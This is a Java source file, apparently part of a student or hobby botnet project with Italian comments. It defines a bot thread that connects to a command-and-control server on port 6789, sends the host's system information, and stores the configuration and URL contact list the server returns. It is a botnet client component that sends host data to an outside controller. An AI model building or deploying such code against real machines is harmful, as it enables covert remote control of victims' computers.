package control.client;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ConnectException;
import java.net.Socket;
import java.util.ArrayList;
import application.Main;
import control.ConfigHeader;
import model.SystemInfoEntry;
import model.URLEntry;

/**
 * Thread presente sul Bot che comunica con il Server C&C al quale invia
 * le informazioni di sistema e dal quale riceve il file di configurazione
 */
public class SocketBotThread extends Thread{
	
	String serverAddress;
	Socket clientSocket;
	Log log;
	ConfigHeader inConfigHeader;
	ArrayList<URLEntry> inContactList;
	ArrayList<SystemInfoEntry> outSystemInfo;
	
	public SocketBotThread(String serverAddress) {
		log = new Log();
		this.serverAddress = serverAddress;
	}
	
	/**
	 * Il metodo run() contatta il Server C&C al quale invia le informazioni di sistema 
	 * e dal quale riceve il file di configurazione
	 */
	@SuppressWarnings("unchecked")
	@Override
	public void run() {
		
		synchronized (this) {
			
			try {
				clientSocket = new Socket(serverAddress, 6789);
	
				ObjectOutputStream outToServer = new ObjectOutputStream(clientSocket.getOutputStream());
	            ObjectInputStream inFromServer = new ObjectInputStream(clientSocket.getInputStream());
	
	     
	            outSystemInfo = Main.bot.getSystemInfoEntryList();
	            outToServer.writeObject(outSystemInfo);
	
	            inConfigHeader = (ConfigHeader)inFromServer.readObject();
	            inContactList = (ArrayList<URLEntry>)inFromServer.readObject();
	            
	            Main.bot.getConfig().setConfigHeader(inConfigHeader);
	            Main.bot.getConfig().setContactsList(inContactList);
	            Main.bot.getConfig().writeFile();
	            
	            clientSocket.close();
	            
			} catch (ConnectException e) {
				String message = "ERROR: Connection with C&C Server refused";
				System.out.println(message);
				log.writeMessage(message);
			} catch (IOException e) {
				e.printStackTrace();
			} catch (ClassNotFoundException e) {
				e.printStackTrace();
			}
			notify();	
		}
	}
	
}
